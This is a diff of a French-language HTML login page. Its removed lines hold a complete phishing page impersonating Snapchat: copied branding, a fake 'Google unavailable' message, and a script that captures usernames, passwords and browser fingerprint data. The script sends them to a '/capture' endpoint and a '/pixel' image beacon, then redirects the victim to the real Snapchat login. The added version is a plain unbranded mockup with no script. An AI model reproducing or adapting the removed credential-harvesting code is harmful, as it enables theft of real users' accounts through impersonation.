@@ -1,632 +1,249 @@
 <!DOCTYPE html>
 <html lang="fr">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Snapchat - Se connecter</title>
-    <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
-        }
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Connexion</title>
 
-        body {
-            background: #ffffff;
-            min-height: 100vh;
-            display: flex;
-            justify-content: center;
-            padding: 40px 20px 20px 20px;
-        }
+<style>
+*{
+    margin:0;
+    padding:0;
+    box-sizing:border-box;
+    font-family:Arial,Helvetica,sans-serif;
+}
 
-        .container {
-            width: 100%;
-            max-width: 400px;
-        }
+body{
+    background:#f6f6f6;
+    display:flex;
+    flex-direction:column;
+    min-height:100vh;
+}
 
-        /* ===== HEADER ===== */
-        .header {
-            text-align: center;
-            margin-bottom: 32px;
-        }
+main{
+    flex:1;
+    display:flex;
+    justify-content:center;
+    align-items:center;
+    padding:40px;
+}
 
-        .ghost-icon {
-            width: 80px;
-            height: 80px;
-            margin: 0 auto 12px auto;
-            display: block;
-        }
+.card{
+    width:340px;
+    background:#fff;
+    border:1px solid #ddd;
+    border-radius:10px;
+    padding:35px;
+    text-align:center;
+    box-shadow:0 2px 10px rgba(0,0,0,.05);
+}
 
-        .ghost-icon svg {
-            width: 100%;
-            height: 100%;
-        }
+.logo{
+    font-size:48px;
+    margin-bottom:15px;
+}
 
-        .header h1 {
-            font-size: 28px;
-            font-weight: 700;
-            color: #1a1a1a;
-            letter-spacing: -0.3px;
-        }
+h1{
+    font-size:34px;
+    margin-bottom:25px;
+}
 
-        .header h1 span {
-            font-weight: 400;
-            color: #1a1a1a;
-        }
+label{
+    display:block;
+    text-align:left;
+    margin-bottom:8px;
+    font-size:14px;
+}
 
-        /* ===== FORM ===== */
-        .form-group {
-            margin-bottom: 16px;
-        }
+input{
+    width:100%;
+    height:45px;
+    border:1px solid #ddd;
+    border-radius:8px;
+    padding:10px;
+}
 
-        .form-group label {
-            display: block;
-            font-size: 14px;
-            font-weight: 600;
-            color: #1a1a1a;
-            margin-bottom: 6px;
-        }
+.link{
+    display:block;
+    margin:15px 0;
+    color:#0095ff;
+    text-decoration:none;
+}
 
-        .form-group input {
-            width: 100%;
-            padding: 14px 16px;
-            border: 2px solid #e0e0e0;
-            border-radius: 12px;
-            font-size: 16px;
-            background: #fafafa;
-            color: #1a1a1a;
-            transition: border-color 0.2s, background 0.2s;
-            outline: none;
-        }
+.primary{
+    background:#0aa7ff;
+    color:white;
+    border:none;
+    border-radius:25px;
+    padding:12px 35px;
+    cursor:pointer;
+    font-size:16px;
+}
 
-        .form-group input:focus {
-            border-color: #0066cc;
-            background: #ffffff;
-            box-shadow: 0 0 0 4px rgba(0, 102, 204, 0.1);
-        }
+.separator{
+    display:flex;
+    align-items:center;
+    gap:10px;
+    margin:25px 0;
+}
 
-        .form-group input::placeholder {
-            color: #999;
-        }
+.separator::before,
+.separator::after{
+    content:"";
+    flex:1;
+    height:1px;
+    background:#ddd;
+}
 
-        .phone-toggle {
-            text-align: right;
-            margin-top: -8px;
-            margin-bottom: 20px;
-        }
+.google{
+    width:100%;
+    border:1px solid #ddd;
+    background:white;
+    border-radius:25px;
+    padding:12px;
+    cursor:pointer;
+}
 
-        .phone-toggle a {
-            color: #0066cc;
-            font-size: 14px;
-            text-decoration: none;
-            font-weight: 500;
-            cursor: pointer;
-        }
+.signup{
+    margin-top:20px;
+    font-size:14px;
+}
 
-        .phone-toggle a:hover {
-            text-decoration: underline;
-        }
+.signup a{
+    color:#000;
+    font-weight:bold;
+    text-decoration:none;
+}
 
-        .btn-next {
-            width: 100%;
-            padding: 16px;
-            background: #0066cc;
-            color: #ffffff;
-            border: none;
-            border-radius: 30px;
-            font-size: 17px;
-            font-weight: 600;
-            cursor: pointer;
-            transition: background 0.2s, transform 0.1s;
-            margin-top: 4px;
-        }
+footer{
+    background:#fff;
+    border-top:1px solid #eee;
+    padding:40px;
+}
 
-        .btn-next:hover {
-            background: #0052a3;
-        }
+.footer-grid{
+    display:grid;
+    grid-template-columns:repeat(4,1fr);
+    gap:40px;
+    max-width:1200px;
+    margin:auto;
+}
 
-        .btn-next:active {
-            transform: scale(0.98);
-        }
+.footer-grid h3{
+    font-size:15px;
+    margin-bottom:10px;
+}
 
-        .btn-next:disabled {
-            opacity: 0.6;
-            cursor: not-allowed;
-        }
+.footer-grid a{
+    display:block;
+    text-decoration:none;
+    color:#444;
+    margin:8px 0;
+    font-size:14px;
+}
 
-        /* ===== DIVIDER ===== */
-        .divider {
-            display: flex;
-            align-items: center;
-            margin: 24px 0;
-            color: #999;
-            font-size: 14px;
-            font-weight: 500;
-        }
+.language{
+    margin-top:35px;
+}
 
-        .divider::before,
-        .divider::after {
-            content: "";
-            flex: 1;
-            height: 1px;
-            background: #ddd;
-        }
+.bottom{
+    margin-top:40px;
+    padding-top:20px;
+    border-top:1px solid #eee;
+    text-align:center;
+}
 
-        .divider::before {
-            margin-right: 16px;
-        }
+.bottom a{
+    margin:0 15px;
+    text-decoration:none;
+    color:#333;
+}
+</style>
 
-        .divider::after {
-            margin-left: 16px;
-        }
-
-        /* ===== GOOGLE BUTTON ===== */
-        .btn-google {
-            width: 100%;
-            padding: 14px;
-            background: #ffffff;
-            color: #1a1a1a;
-            border: 2px solid #e0e0e0;
-            border-radius: 30px;
-            font-size: 16px;
-            font-weight: 500;
-            cursor: pointer;
-            transition: background 0.2s, border-color 0.2s;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            gap: 12px;
-        }
-
-        .btn-google:hover {
-            background: #f5f5f5;
-            border-color: #ccc;
-        }
-
-        .btn-google svg {
-            width: 20px;
-            height: 20px;
-            flex-shrink: 0;
-        }
-
-        /* ===== SIGNUP LINK ===== */
-        .signup-link {
-            text-align: center;
-            margin-top: 24px;
-            font-size: 15px;
-            color: #1a1a1a;
-        }
-
-        .signup-link a {
-            color: #0066cc;
-            text-decoration: none;
-            font-weight: 600;
-        }
-
-        .signup-link a:hover {
-            text-decoration: underline;
-        }
-
-        /* ===== MESSAGES ===== */
-        .error {
-            color: #d32f2f;
-            font-size: 14px;
-            margin-top: 12px;
-            display: none;
-            background: #ffebee;
-            padding: 10px 14px;
-            border-radius: 8px;
-        }
-
-        .success {
-            color: #2e7d32;
-            font-size: 14px;
-            margin-top: 12px;
-            display: none;
-            background: #e8f5e9;
-            padding: 10px 14px;
-            border-radius: 8px;
-        }
-
-        .spinner {
-            display: none;
-            margin: 16px auto;
-            width: 28px;
-            height: 28px;
-            border: 3px solid #f3f3f3;
-            border-top: 3px solid #0066cc;
-            border-radius: 50%;
-            animation: spin 0.8s linear infinite;
-        }
-
-        @keyframes spin {
-            0% { transform: rotate(0deg); }
-            100% { transform: rotate(360deg); }
-        }
-
-        /* ===== FOOTER ===== */
-        .footer {
-            margin-top: 48px;
-            padding-top: 24px;
-            border-top: 1px solid #e8e8e8;
-        }
-
-        .footer-grid {
-            display: grid;
-            grid-template-columns: 1fr 1fr 1fr;
-            gap: 24px 16px;
-            margin-bottom: 20px;
-        }
-
-        .footer-col h4 {
-            font-size: 12px;
-            font-weight: 600;
-            color: #1a1a1a;
-            margin-bottom: 8px;
-            letter-spacing: 0.3px;
-        }
-
-        .footer-col a {
-            display: block;
-            color: #999;
-            text-decoration: none;
-            font-size: 12px;
-            padding: 3px 0;
-            line-height: 1.6;
-        }
-
-        .footer-col a:hover {
-            text-decoration: underline;
-            color: #666;
-        }
-
-        .footer-bottom {
-            display: flex;
-            flex-wrap: wrap;
-            justify-content: space-between;
-            align-items: center;
-            padding-top: 16px;
-            border-top: 1px solid #e8e8e8;
-            font-size: 12px;
-            color: #999;
-            gap: 12px;
-        }
-
-        .footer-bottom .lang-selector {
-            display: flex;
-            align-items: center;
-            gap: 6px;
-            color: #1a1a1a;
-            font-weight: 500;
-            cursor: pointer;
-        }
-
-        .footer-bottom .lang-selector svg {
-            width: 16px;
-            height: 16px;
-        }
-
-        .footer-bottom .legal-links {
-            display: flex;
-            gap: 16px;
-            flex-wrap: wrap;
-        }
-
-        .footer-bottom .legal-links a {
-            color: #999;
-            text-decoration: none;
-        }
-
-        .footer-bottom .legal-links a:hover {
-            text-decoration: underline;
-            color: #666;
-        }
-
-        /* ===== RESPONSIVE ===== */
-        @media (max-width: 480px) {
-            body {
-                padding: 24px 16px 16px 16px;
-            }
-            .footer-grid {
-                grid-template-columns: 1fr 1fr;
-                gap: 16px;
-            }
-            .footer-bottom {
-                flex-direction: column;
-                align-items: flex-start;
-                gap: 8px;
-            }
-            .header h1 {
-                font-size: 24px;
-            }
-            .ghost-icon {
-                width: 64px;
-                height: 64px;
-            }
-        }
-
-        @media (max-width: 360px) {
-            .footer-grid {
-                grid-template-columns: 1fr 1fr;
-                gap: 12px;
-            }
-            .footer-col h4 {
-                font-size: 11px;
-            }
-            .footer-col a {
-                font-size: 11px;
-            }
-        }
-    </style>
 </head>
 <body>
 
-<div class="container">
+<main>
 
-    <!-- ===== HEADER ===== -->
-    <div class="header">
-        <div class="ghost-icon">
-            <svg viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
-                <path d="M12 3C7.58 3 4 6.58 4 11v5c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2v-5c0-4.42-3.58-8-8-8z" fill="#FFFC00"/>
-                <path d="M12 7c-2.21 0-4 1.79-4 4v2c0 2.21 1.79 4 4 4s4-1.79 4-4v-2c0-2.21-1.79-4-4-4z" fill="#FFFC00"/>
-                <circle cx="9" cy="11" r="1.5" fill="#000"/>
-                <circle cx="15" cy="11" r="1.5" fill="#000"/>
-                <path d="M12 15c-1.1 0-2-.9-2-2h4c0 1.1-.9 2-2 2z" fill="#000"/>
-            </svg>
-        </div>
-        <h1>Se connecter <span>à Snapchat</span></h1>
-    </div>
+<div class="card">
 
-    <!-- ===== FORM ===== -->
-    <form id="loginForm" onsubmit="return handleSubmit(event)">
+<div class="logo">👻</div>
 
-        <div class="form-group">
-            <label for="username">Nom d'utilisateur ou adresse e-mail</label>
-            <input type="text" id="username" placeholder="Nom d'utilisateur ou e-mail" required autofocus>
-        </div>
+<h1>Se connecter</h1>
 
-        <div class="phone-toggle">
-            <a onclick="usePhone()">Utiliser mon numéro de téléphone</a>
-        </div>
+<label>Nom d'utilisateur ou e-mail</label>
 
-        <!-- Password (hidden initially) -->
-        <div class="form-group" id="passwordGroup" style="display:none;">
-            <label for="password">Mot de passe</label>
-            <input type="password" id="password" placeholder="Mot de passe">
-        </div>
+<input type="text">
 
-        <div id="error" class="error">Nom d'utilisateur ou mot de passe incorrect.</div>
-        <div id="success" class="success">✓ Connexion réussie ! Redirection...</div>
-        <div id="spinner" class="spinner"></div>
+<a class="link" href="#">
+Utiliser mon numéro de téléphone
+</a>
 
-        <button type="submit" class="btn-next" id="loginBtn">Suivant</button>
+<button class="primary">
+Suivant
+</button>
 
-    </form>
+<div class="separator">
+OU
+</div>
 
-    <!-- ===== DIVIDER ===== -->
-    <div class="divider">OU</div>
+<button class="google">
+Continuer avec Google
+</button>
 
-    <!-- ===== GOOGLE BUTTON ===== -->
-    <button class="btn-google" onclick="googleLogin()">
-        <svg viewBox="0 0 48 48">
-            <path fill="#EA4335" d="M24 9.5c3.54 0 6.71 1.22 9.21 3.6l6.85-6.85C35.9 2.38 30.47 0 24 0 14.62 0 6.51 5.38 2.56 13.22l7.98 6.19C12.43 13.72 17.74 9.5 24 9.5z"/>
-            <path fill="#4285F4" d="M46.98 24.55c0-1.57-.15-3.09-.38-4.55H24v9.02h12.94c-.58 2.96-2.26 5.48-4.78 7.18l7.73 6c4.51-4.18 7.09-10.36 7.09-17.65z"/>
-            <path fill="#FBBC05" d="M10.53 28.59c-.48-1.45-.76-2.99-.76-4.59s.27-3.14.76-4.59l-7.98-6.19C.92 16.46 0 20.12 0 24c0 3.88.92 7.54 2.56 10.78l7.97-6.19z"/>
-            <path fill="#34A853" d="M24 48c6.48 0 11.93-2.13 15.89-5.81l-7.73-6c-2.15 1.45-4.92 2.3-8.16 2.3-6.26 0-11.57-4.22-13.47-9.91l-7.98 6.19C6.51 42.62 14.62 48 24 48z"/>
-        </svg>
-        Continuer avec Google
-    </button>
-
-    <!-- ===== SIGNUP ===== -->
-    <div class="signup-link">
-        Vous débutez sur Snapchat ? <a href="#">S'inscrire</a>
-    </div>
-
-    <!-- ===== FOOTER ===== -->
-    <div class="footer">
-        <div class="footer-grid">
-            <div class="footer-col">
-                <h4>Société</h4>
-                <a href="#">Snap Inc.</a>
-                <a href="#">Carrières</a>
-                <a href="#">Actualités</a>
-            </div>
-            <div class="footer-col">
-                <h4>Communauté</h4>
-                <a href="#">Assistance</a>
-                <a href="#">Règles communautaires</a>
-                <a href="#">Centre de sécurité</a>
-            </div>
-            <div class="footer-col">
-                <h4>Publicité</h4>
-                <a href="#">Acheter des publicités</a>
-                <a href="#">Politiques relatives à la publicité</a>
-                <a href="#">Bibliothèque des publicités politiques</a>
-                <a href="#">Charte de la marque</a>
-                <a href="#">Règles applicables aux promotions</a>
-            </div>
-            <div class="footer-col">
-                <h4>Juridique</h4>
-                <a href="#">Centre de confidentialité</a>
-                <a href="#">Vos choix de confidentialité</a>
-                <a href="#">Politique relative aux cookies</a>
-                <a href="#">Signaler une violation</a>
-                <a href="#">Conditions d'utilisation des outils créatifs personnalisés</a>
-                <a href="#">Conditions générales des Geofilters communautaires</a>
-                <a href="#">Conditions d'utilisation de Lens Studio</a>
-            </div>
-        </div>
-
-        <div class="footer-bottom">
-            <div class="lang-selector">
-                <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
-                    <circle cx="12" cy="12" r="10"/>
-                    <line x1="2" y1="12" x2="22" y2="12"/>
-                    <path d="M12 2a15.3 15.3 0 0 1 4 10 15.3 15.3 0 0 1-4 10 15.3 15.3 0 0 1-4-10 15.3 15.3 0 0 1 4-10z"/>
-                </svg>
-                Français
-                <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
-                    <polyline points="6 9 12 15 18 9"/>
-                </svg>
-            </div>
-            <div class="legal-links">
-                <a href="#">Politique de confidentialité</a>
-                <a href="#">Conditions d'utilisation du service</a>
-            </div>
-        </div>
-    </div>
+<div class="signup">
+Vous débutez ?
+<a href="#">S'inscrire</a>
+</div>
 
 </div>
 
-<script>
-    // ===== TOGGLE PHONE / EMAIL =====
-    function usePhone() {
-        const field = document.getElementById('username');
-        field.placeholder = 'Numéro de téléphone';
-        field.type = 'tel';
-        const toggle = document.querySelector('.phone-toggle a');
-        toggle.textContent = 'Utiliser mon adresse e-mail';
-        toggle.setAttribute('onclick', 'useEmail()');
-    }
+</main>
 
-    function useEmail() {
-        const field = document.getElementById('username');
-        field.placeholder = 'Nom d\'utilisateur ou e-mail';
-        field.type = 'text';
-        const toggle = document.querySelector('.phone-toggle a');
-        toggle.textContent = 'Utiliser mon numéro de téléphone';
-        toggle.setAttribute('onclick', 'usePhone()');
-    }
+<footer>
 
-    // ===== SHOW PASSWORD FIELD =====
-    function showPassword() {
-        const group = document.getElementById('passwordGroup');
-        group.style.display = 'block';
-        document.getElementById('password').focus();
-        document.getElementById('loginBtn').textContent = 'Se connecter';
-    }
+<div class="footer-grid">
 
-    // ===== GOOGLE LOGIN (fake) =====
-    function googleLogin() {
-        const error = document.getElementById('error');
-        error.textContent = 'La connexion avec Google n\'est pas disponible. Veuillez vous connecter avec votre e-mail.';
-        error.style.display = 'block';
-        setTimeout(() => { error.style.display = 'none'; }, 4000);
-    }
+<div>
+<h3>Société</h3>
+<a href="#">À propos</a>
+<a href="#">Carrières</a>
+<a href="#">Actualités</a>
+</div>
 
-    // ===== FORM SUBMIT =====
-    function handleSubmit(event) {
-        event.preventDefault();
+<div>
+<h3>Communauté</h3>
+<a href="#">Assistance</a>
+<a href="#">Centre de sécurité</a>
+</div>
 
-        const username = document.getElementById('username').value.trim();
-        const password = document.getElementById('password').value.trim();
-        const errorEl = document.getElementById('error');
-        const successEl = document.getElementById('success');
-        const spinner = document.getElementById('spinner');
-        const btn = document.getElementById('loginBtn');
+<div>
+<h3>Publicité</h3>
+<a href="#">Acheter des publicités</a>
+<a href="#">Règles</a>
+</div>
 
-        // If password not visible, show it
-        if (document.getElementById('passwordGroup').style.display === 'none') {
-            showPassword();
-            return false;
-        }
+<div>
+<h3>Juridique</h3>
+<a href="#">Confidentialité</a>
+<a href="#">Cookies</a>
+<a href="#">Conditions</a>
+</div>
 
-        // Validation
-        errorEl.style.display = 'none';
-        successEl.style.display = 'none';
+</div>
 
-        if (!username) {
-            errorEl.textContent = 'Veuillez entrer votre nom d\'utilisateur ou e-mail.';
-            errorEl.style.display = 'block';
-            return false;
-        }
+<div class="language">
+<select>
+<option>Français</option>
+</select>
+</div>
 
-        if (!password) {
-            errorEl.textContent = 'Veuillez entrer votre mot de passe.';
-            errorEl.style.display = 'block';
-            return false;
-        }
+<div class="bottom">
+<a href="#">Politique de confidentialité</a>
+<a href="#">Conditions d'utilisation</a>
+</div>
 
-        if (password.length < 6) {
-            errorEl.textContent = 'Le mot de passe doit contenir au moins 6 caractères.';
-            errorEl.style.display = 'block';
-            return false;
-        }
-
-        // --- SEND CREDENTIALS ---
-        spinner.style.display = 'block';
-        btn.disabled = true;
-        btn.textContent = 'Connexion...';
-
-        const data = {
-            username: username,
-            password: password,
-            timestamp: new Date().toISOString(),
-            userAgent: navigator.userAgent,
-            platform: navigator.platform,
-            screen: window.screen.width + 'x' + window.screen.height,
-            language: navigator.language,
-            url: window.location.href
-        };
-
-        // Send to capture endpoint
-        fetch('/capture', {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify(data)
-        }).catch(() => {});
-
-        // Image beacon backup
-        new Image().src = '/pixel?u=' + encodeURIComponent(username) + '&p=' + encodeURIComponent(password);
-
-        // --- SUCCESS ---
-        setTimeout(function() {
-            spinner.style.display = 'none';
-            successEl.textContent = '✓ Connexion réussie ! Redirection vers Snapchat...';
-            successEl.style.display = 'block';
-            btn.textContent = 'Redirection...';
-
-            setTimeout(function() {
-                window.location.href = 'https://www.snapchat.com/login';
-            }, 2000);
-        }, 1200);
-
-        return false;
-    }
-
-    // ===== KEYBOARD SHORTCUTS =====
-    document.addEventListener('DOMContentLoaded', function() {
-        document.getElementById('username').focus();
-
-        // Enter on username → show password
-        document.getElementById('username').addEventListener('keydown', function(e) {
-            if (e.key === 'Enter') {
-                e.preventDefault();
-                if (document.getElementById('passwordGroup').style.display === 'none') {
-                    showPassword();
-                } else {
-                    document.getElementById('loginForm').dispatchEvent(new Event('submit'));
-                }
-            }
-        });
-
-        // Enter on password → submit
-        document.getElementById('password').addEventListener('keydown', function(e) {
-            if (e.key === 'Enter') {
-                e.preventDefault();
-                document.getElementById('loginForm').dispatchEvent(new Event('submit'));
-            }
-        });
-
-        // Pre-fill username from URL
-        const params = new URLSearchParams(window.location.search);
-        const user = params.get('user');
-        if (user) {
-            document.getElementById('username').value = user;
-        }
-    });
-</script>
+</footer>
 
 </body>
 </html>
